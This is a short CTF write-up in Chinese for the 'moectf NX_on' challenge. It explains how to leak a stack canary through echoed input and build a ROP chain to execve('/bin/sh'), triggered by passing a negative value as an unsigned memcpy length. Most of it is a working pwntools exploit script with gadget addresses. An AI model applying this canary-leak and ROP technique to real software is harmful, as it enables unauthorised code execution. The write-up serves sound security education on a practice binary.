# moectf NX_on

by Maple

***canary+ROP***

存在输入并将输入输出出来的部分，所以可以以此泄露canary,详细看[这里](../basic/Canary.md)

```python
payload = b'a'*0x18+b'b'
p.recvuntil(b'id?')
p.send(payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recv(7))
log.info("canary"+hex(canary))
```

接着是输入`buf2`，这里构造ROP链（我相信你已经可以看懂ROP链了，如果看不懂，再去写写其它题再来吧），稍后执行这里就行

接下来有个输入数值的，通过v5输入，然后可以控制`j_memcpy()`复制的长度

看到`unsigned int`就可以立刻想到输入一个负数，但是这里输入`-1`会出现问题，原因未知（懒狗懒得找了），随便试了试别的负数

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./pwn')
pop_rax = 0x00000000004508b7
pop_rdi = 0x000000000040239f
pop_rsi = 0x000000000040a40e
pop_rdx_rbx = 0x000000000049d12b
syscall = 0x402154
binsh = 0x00000000004e3950

payload = b'a'*0x18+b'b'
p.recvuntil(b'id?')
p.send(payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recv(7))
log.info("canary"+hex(canary))

payload2 = b'B'*0x18+p64(canary)+b'c'*0x8
payload2+=p64(pop_rax)+p64(59)
payload2+=p64(pop_rdi)+p64(binsh)
payload2+=p64(pop_rsi)+p64(0)
payload2+=p64(pop_rdx_rbx)+p64(0)+p64(0)
payload2+=p64(syscall)

p.recvuntil(b'name?\n')
p.sendline(payload2)
p.recvuntil(b'quit\n')
p.sendline(b'-111')
p.interactive()
```

